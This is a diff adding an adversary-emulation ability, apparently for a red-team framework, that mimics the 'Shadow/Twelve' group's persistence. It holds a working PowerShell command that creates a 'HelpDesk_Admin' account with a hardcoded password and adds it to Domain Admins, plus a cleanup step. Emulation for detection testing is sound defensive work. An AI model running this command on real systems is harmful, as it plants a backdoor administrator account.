@@ -1,0 +1,13 @@
+- id: 612b6cfa-4ebe-4e50-bb1f-9feff9f4aaat
+  name: "[SHADOW-TWELVE] Domain Admin-user creation"
+  description: "Для сохранения доступа к внутреннему периметру жертв Shadow создает локальные и доменные учетные записи"
+  tactic: persistence
+  technique:
+    attack_id: T1136.002
+    name: "Create Account: Domain Account"
+  platforms:
+    windows:
+      cmd:
+        command: $Domain = (Get-WmiObject Win32_ComputerSystem).Domain; New-ADUser -Name "HelpDesk_Admin" -AccountPassword (ConvertTo-SecureString "Winter2024!" -AsPlainText -Force) -Enabled $true -Server $Domain; Add-ADGroupMember "Администраторы домена" "HelpDesk_Admin" -Server $Domain;
+        cleanup: Get-ADUser "HelpDesk_Admin" | Remove-ADUser -Confirm:$false
+        timeout: 120
